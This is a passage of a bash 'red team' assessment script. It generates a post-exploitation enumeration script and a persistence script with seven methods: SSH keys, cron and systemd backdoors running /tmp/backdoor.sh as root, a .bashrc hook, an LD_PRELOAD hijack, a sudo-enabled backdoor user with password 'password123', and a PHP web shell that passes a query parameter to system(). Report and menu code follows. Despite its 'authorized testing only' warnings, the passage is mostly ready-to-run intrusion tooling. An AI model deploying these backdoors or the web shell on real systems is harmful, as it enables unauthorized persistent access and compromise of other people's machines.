echo \"[*] Reading configuration files...\"
echo \"=== Configuration Files ===\" > configs.txt
cat /etc/apache2/apache2.conf >> configs.txt 2>/dev/null
cat /etc/nginx/nginx.conf >> configs.txt 2>/dev/null
cat /etc/mysql/my.cnf >> configs.txt 2>/dev/null
cat /etc/postgresql/*/main/postgresql.conf >> configs.txt 2>/dev/null

# Sudo Rights
echo \"[*] Checking sudo rights...\"
echo \"=== Sudo Rights ===\" > sudo_rights.txt
sudo -l >> sudo_rights.txt 2>/dev/null

# Capabilities
echo \"[*] Checking file capabilities...\"
getcap -r / 2>/dev/null > capabilities.txt

# Firewall Rules
echo \"[*] Checking firewall rules...\"
echo \"=== Firewall Rules ===\" > firewall.txt
iptables -L -n >> firewall.txt 2>/dev/null
ufw status >> firewall.txt 2>/dev/null

echo
echo \"[*] Post-exploitation enumeration completed\"
echo \"[*] All results saved to current directory\"
echo
echo \"=== FILES GENERATED ===\"
ls -lh *.txt

echo
echo \"=== NEXT STEPS ===\"
echo \"1. Review all enumeration files\"
echo \"2. Look for privilege escalation vectors\"
echo \"3. Harvest credentials and keys\"
echo \"4. Establish persistence\"
echo \"5. Move laterally if possible\"
POSTEXPLOIT
chmod +x '$OUTDIR/exploit/post_exploit.sh' && \
cat '$OUTDIR/exploit/post_exploit.sh'" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/post_exploit.sh"
    
    # Persistence techniques COMPLÈTES (7 méthodes)
    execute_scan "Generate Persistence Techniques" \
        "cat > '$OUTDIR/exploit/persistence.sh' << 'PERSISTENCE'
#!/bin/bash
# PERSISTENCE TECHNIQUES - 7 METHODS

echo \"=== PERSISTENCE ESTABLISHMENT ===\"
echo \"WARNING: Only use on authorized systems\"
echo

# Method 1: SSH Key Persistence
echo \"[*] Method 1: SSH Key Persistence\"
mkdir -p ~/.ssh 2>/dev/null
chmod 700 ~/.ssh
echo \"# Add your public key here\" >> ~/.ssh/authorized_keys
# echo \"ssh-rsa YOUR_PUBLIC_KEY_HERE user@host\" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo \"[+] SSH key persistence configured\"
echo \"    Add your public key to: ~/.ssh/authorized_keys\"
echo

# Method 2: Cron Job Persistence
echo \"[*] Method 2: Cron Job Persistence\"
# Reverse shell cron job
# (crontab -l 2>/dev/null; echo \"@reboot /tmp/backdoor.sh\") | crontab -
# (crontab -l 2>/dev/null; echo \"*/5 * * * * /tmp/backdoor.sh\") | crontab -
echo \"[+] Cron job persistence ready\"
echo \"    Add to crontab: */5 * * * * /path/to/backdoor.sh\"
echo

# Method 3: Systemd Service Persistence
echo \"[*] Method 3: Systemd Service Persistence\"
cat > /tmp/backdoor.service << 'SERVICE'
[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/tmp/backdoor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
SERVICE
echo \"[+] Systemd service file created: /tmp/backdoor.service\"
echo \"    Install with:\"
echo \"    sudo mv /tmp/backdoor.service /etc/systemd/system/\"
echo \"    sudo systemctl enable backdoor.service\"
echo \"    sudo systemctl start backdoor.service\"
echo

# Method 4: .bashrc Persistence
echo \"[*] Method 4: .bashrc Persistence\"
echo \"# /tmp/backdoor.sh &\" >> /tmp/bashrc_append.txt
echo \"[+] Bashrc persistence ready\"
echo \"    Append to ~/.bashrc or /etc/bash.bashrc\"
echo

# Method 5: LD_PRELOAD Library Hijacking
echo \"[*] Method 5: LD_PRELOAD Persistence\"
echo \"# /tmp/malicious.so\" > /tmp/ld.so.preload
echo \"[+] LD_PRELOAD persistence ready\"
echo \"    Copy to /etc/ld.so.preload (requires root)\"
echo

# Method 6: User Account Creation
echo \"[*] Method 6: Backdoor User Account\"
echo \"[+] User account persistence ready\"
echo \"    Create backdoor user:\"
echo \"    sudo useradd -m -s /bin/bash backdoor\"
echo \"    echo 'backdoor:password123' | sudo chpasswd\"
echo \"    sudo usermod -aG sudo backdoor\"
echo

# Method 7: Web Shell Deployment
echo \"[*] Method 7: Web Shell Persistence\"
cat > /tmp/shell.php << 'WEBSHELL'
<?php
if(isset(\$_GET['cmd'])) {
    system(\$_GET['cmd']);
}
?>
WEBSHELL
echo \"[+] Web shell created: /tmp/shell.php\"
echo \"    Copy to web root:\"
echo \"    sudo cp /tmp/shell.php /var/www/html/\"
echo \"    Access: http://target/shell.php?cmd=id\"
echo

echo \"=== PERSISTENCE METHODS SUMMARY ===\"
echo \"1. SSH Keys - Stealthy, requires SSH access\"
echo \"2. Cron Jobs - Automatic execution, survives reboots\"
echo \"3. Systemd Services - Professional, persistent service\"
echo \"4. .bashrc - Executes on user login\"
echo \"5. LD_PRELOAD - Library injection, stealthy\"
echo \"6. User Account - Simple, requires root\"
echo \"7. Web Shell - HTTP access, easy to use\"
echo
echo \"Choose persistence method based on:\"
echo \"- Required privileges\"
echo \"- Stealth requirements\"
echo \"- Reliability needs\"
echo \"- Detection risk\"
PERSISTENCE
chmod +x '$OUTDIR/exploit/persistence.sh' && \
cat '$OUTDIR/exploit/persistence.sh'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/persistence.sh"
    
    echo -e "${GREEN}[COMPLETE]${NC} Exploitation preparation completed"
}

generate_report() {
    local report="$OUTDIR/reports/executive_summary.txt"
    
    echo -e "\n${CYAN}[REPORT]${NC} Generating executive summary report..."
    
    mkdir -p "$OUTDIR/reports"
    
    set +e
    
    {
        echo "╔════════════════════════════════════════════════════════════════════════════╗"
        echo "║                     RED TEAM ASSESSMENT REPORT                            ║"
        echo "╚════════════════════════════════════════════════════════════════════════════╝"
        echo
        echo "┌─ TARGET INFORMATION ───────────────────────────────────────────────────────┐"
        echo "│ Target: $TARGET"
        [ -n "$URL" ] && echo "│ URL: $URL"
        [ -n "$DOMAIN" ] && echo "│ Domain: $DOMAIN"
        echo "│ Assessment Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "│ Scanner Version: Security Scanner v$VERSION"
        [ "$QUICK_MODE" = true ] && echo "│ Scan Mode: Quick (3x faster)"
        [ "$STEALTH_MODE" = true ] && echo "│ Scan Mode: Stealth (IDS/IPS evasion)"
        [ "$AGGRESSIVE_MODE" = true ] && echo "│ Scan Mode: Aggressive (full coverage)"
        echo "└────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "┌─ EXECUTIVE SUMMARY ────────────────────────────────────────────────────────┐"
        
        # Count findings
        local critical=0 high=0 medium=0 low=0
        
        for file in "$OUTDIR/network/nmap_vulns.txt" "$OUTDIR/network/nmap_critical_vulns.txt" \
                    "$OUTDIR/network/smb_enum.txt"; do
            [ -f "$file" ] && critical=$((critical + $(grep -ci "VULNERABLE\|CRITICAL\|ms17-010\|EternalBlue\|CVE.*CRITICAL" "$file" 2>/dev/null | grep -v "NOT VULNERABLE" || echo 0)))
        done
        
        for file in "$OUTDIR/web/nuclei.txt" "$OUTDIR/web/nikto.txt"; do
            [ -f "$file" ] && high=$((high + $(grep -ci "high\|critical" "$file" 2>/dev/null || echo 0)))
        done
        
        for file in "$OUTDIR/network/nmap_vulns.txt" "$OUTDIR/web/nikto.txt" "$OUTDIR/web/gobuster_common.txt"; do
            [ -f "$file" ] && medium=$((medium + $(grep -ci "medium\|warning\|OSVDB" "$file" 2>/dev/null || echo 0)))
        done
        
        [ -f "$OUTDIR/network/nmap_ports.txt" ] && low=$(($(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null || echo 0)))
        
        critical=${critical:-0}
        high=${high:-0}
        medium=${medium:-0}
        low=${low:-0}
        [[ ! "$critical" =~ ^[0-9]+$ ]] && critical=0
        [[ ! "$high" =~ ^[0-9]+$ ]] && high=0
        [[ ! "$medium" =~ ^[0-9]+$ ]] && medium=0
        [[ ! "$low" =~ ^[0-9]+$ ]] && low=0
        
        echo "│ Critical Vulnerabilities: $critical"
        echo "│ High Risk Issues: $high"
        echo "│ Medium Risk Issues: $medium"
        echo "│ Low Risk Items: $low"
        
        if [ -f "$OUTDIR/network/nmap_ports.txt" ]; then
            local ports=$(grep -c "open" "$OUTDIR/network/nmap_ports.txt" 2>/dev/null || echo 0)
            echo "│ Open Ports: $ports"
        fi
        
        if [ -f "$OUTDIR/osint/all_subdomains.txt" ]; then
            local subs=$(wc -l < "$OUTDIR/osint/all_subdomains.txt" 2>/dev/null || echo 0)
            echo "│ Subdomains: $subs"
        fi
        
        local risk=$((critical * 10 + high * 5 + medium * 2 + low * 1))
        [ $risk -gt 100 ] && risk=100
        
        echo "│ Risk Score: $risk/100"
        
        if [ $risk -ge 70 ]; then
            echo "│ Risk Level: CRITICAL"
        elif [ $risk -ge 40 ]; then
            echo "│ Risk Level: HIGH"
        elif [ $risk -ge 20 ]; then
            echo "│ Risk Level: MEDIUM"
        else
            echo "│ Risk Level: LOW"
        fi
        
        echo "└────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "┌─ RECOMMENDATIONS ──────────────────────────────────────────────────────────┐"
        echo "│ Immediate Actions:"
        echo "│   1. Patch all critical vulnerabilities"
        echo "│   2. Disable unnecessary services"
        echo "│   3. Implement strong authentication"
        echo "│   4. Deploy network segmentation"
        echo "│   5. Enable comprehensive logging"
        echo "│"
        echo "│ Red Team Next Steps:"
        echo "│   1. Review exploit scripts in exploit/"
        echo "│   2. Test default credentials"
        echo "│   3. Run automated attacks"
        echo "│   4. Execute Metasploit modules"
        echo "└────────────────────────────────────────────────────────────────────────────┘"
        echo
        
        echo "┌─ OUTPUT FILES ─────────────────────────────────────────────────────────────┐"
        echo "│ Location: $OUTDIR"
        echo "│ Reports: $OUTDIR/reports/"
        echo "│ Exploits: $OUTDIR/exploit/"
        echo "└────────────────────────────────────────────────────────────────────────────┘"
        echo
        echo "╔════════════════════════════════════════════════════════════════════════════╗"
        echo "║         Security Scanner v$VERSION - Assessment Complete                  ║"
        echo "╚════════════════════════════════════════════════════════════════════════════╝"
        
    } > "$report" 2>/dev/null
    
    set -e
    
    if [ -f "$report" ] && [ -s "$report" ]; then
        local lines=$(wc -l < "$report")
        echo -e "${GREEN}[SUCCESS]${NC} Report: ${WHITE}$report${NC} ${DIM}($lines lines)${NC}"
        generate_json_report
        return 0
    else
        echo -e "${RED}[ERROR]${NC} Report failed"
        {
            echo "BACKUP REPORT"
            echo "Target: $TARGET"
            echo "Date: $(date)"
            find "$OUTDIR" -name "*.txt" -type f 2>/dev/null
        } > "$OUTDIR/reports/backup_report.txt"
        return 1
    fi
}

generate_json_report() {
    local json="$OUTDIR/reports/assessment.json"
    
    {
        echo "{"
        echo "  \"target\": \"$TARGET\","
        echo "  \"url\": \"$URL\","
        echo "  \"domain\": \"$DOMAIN\","
        echo "  \"date\": \"$(date -Iseconds)\","
        echo "  \"version\": \"$VERSION\","
        echo "  \"mode\": \"$([ "$QUICK_MODE" = true ] && echo "quick" || ([ "$STEALTH_MODE" = true ] && echo "stealth" || ([ "$AGGRESSIVE_MODE" = true ] && echo "aggressive" || echo "standard")))\","
        echo "  \"results\": {"
        echo "    \"osint\": {"
        echo "      \"subdomains\": $([ -f "$OUTDIR/osint/all_subdomains.txt" ] && wc -l < "$OUTDIR/osint/all_subdomains.txt" || echo 0),"
        echo "      \"emails\": $([ -f "$OUTDIR/osint/emails.txt" ] && grep -c "@" "$OUTDIR/osint/emails.txt" || echo 0)"
        echo "    },"
        echo "    \"network\": {"
        echo "      \"ports\": $([ -f "$OUTDIR/network/nmap_ports.txt" ] && grep -c "open" "$OUTDIR/network/nmap_ports.txt" || echo 0),"
        echo "      \"vulns\": $([ -f "$OUTDIR/network/nmap_vulns.txt" ] && grep -c "VULNERABLE" "$OUTDIR/network/nmap_vulns.txt" || echo 0)"
        echo "    },"
        echo "    \"web\": {"
        echo "      \"dirs\": $([ -f "$OUTDIR/web/gobuster_common.txt" ] && wc -l < "$OUTDIR/web/gobuster_common.txt" || echo 0),"
        echo "      \"vulns\": $([ -f "$OUTDIR/web/nuclei.txt" ] && wc -l < "$OUTDIR/web/nuclei.txt" || echo 0)"
        echo "    }"
        echo "  },"
        echo "  \"files\": $(find "$OUTDIR" -type f 2>/dev/null | wc -l)"
        echo "}"
    } > "$json" 2>/dev/null
    
    if [ -f "$json" ] && [ -s "$json" ]; then
        echo -e "${GREEN}[SUCCESS]${NC} JSON: ${WHITE}$json${NC}"
        command -v jq &>/dev/null && jq empty "$json" 2>/dev/null && echo -e "${GREEN}[VALID]${NC} JSON validated"
    fi
}

main() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help) show_help; exit 0 ;;
            -v|--version) echo "Security Scanner v$VERSION"; exit 0 ;;
            -q|--quick) QUICK_MODE=true; shift ;;
            -s|--stealth) STEALTH_MODE=true; shift ;;
            -a|--aggressive) AGGRESSIVE_MODE=true; shift ;;
            *) echo "Unknown option: $1"; exit 1 ;;
        esac
    done
    
    trap 'handle_interrupt' SIGINT SIGTERM
    
    display_banner
    
    echo -e "${ORANGE}Target Configuration:${NC}"
    read -rp "$(echo -e ${WHITE}IP:${NC} )" TARGET
    [ -z "$TARGET" ] && { echo -e "${RED}[ERROR]${NC} IP required"; exit 1; }
    
    read -rp "$(echo -e ${WHITE}URL \(optional\):${NC} )" URL
    read -rp "$(echo -e ${WHITE}Domain \(optional\):${NC} )" DOMAIN
    
    [ -n "$URL" ] && [ -z "$DOMAIN" ] && DOMAIN=$(echo "$URL" | sed -E 's|https?://([^/]+).*|\1|')
    
    show_scan_menu
    read -rp "$(echo -e ${ORANGE}Select [1-4]:${NC} )" CHOICE
    
    prepare_output
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${ORANGE}ASSESSMENT STARTED${NC}                   ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}Ctrl+C to stop gracefully${NC}"
    echo
    
    case "$CHOICE" in
        1) run_osint_scans "$TARGET" "$DOMAIN" ;;
        2) run_network_scans "$TARGET" ;;
        3) 
            [ -z "$URL" ] && { echo -e "${RED}[ERROR]${NC} URL required"; exit 1; }
            run_web_scans "$URL"
            ;;
        4)
            run_osint_scans "$TARGET" "$DOMAIN"
            [ "$SCAN_INTERRUPTED" = false ] && run_network_scans "$TARGET"
            [ "$SCAN_INTERRUPTED" = false ] && [ -n "$URL" ] && run_web_scans "$URL"
            [ "$SCAN_INTERRUPTED" = false ] && run_exploitation_prep "$TARGET"
            ;;
        *) echo -e "${RED}[ERROR]${NC} Invalid choice"; exit 1 ;;
    esac
    
    [ "$SCAN_INTERRUPTED" = true ] && exit 130
    
    generate_report
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}              ${GREEN}COMPLETED${NC}                            ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${ORANGE}Results:${NC} ${WHITE}$OUTDIR/${NC}"
    echo -e "${ORANGE}Report:${NC} ${WHITE}$OUTDIR/reports/executive_summary.txt${NC}"
    echo -e "${ORANGE}Scripts:${NC} ${WHITE}$OUTDIR/exploit/auto_attack.sh${NC}"
    echo
    echo -e "${YELLOW}Use responsibly - Authorized testing only${NC}"
    echo
}

main "$@"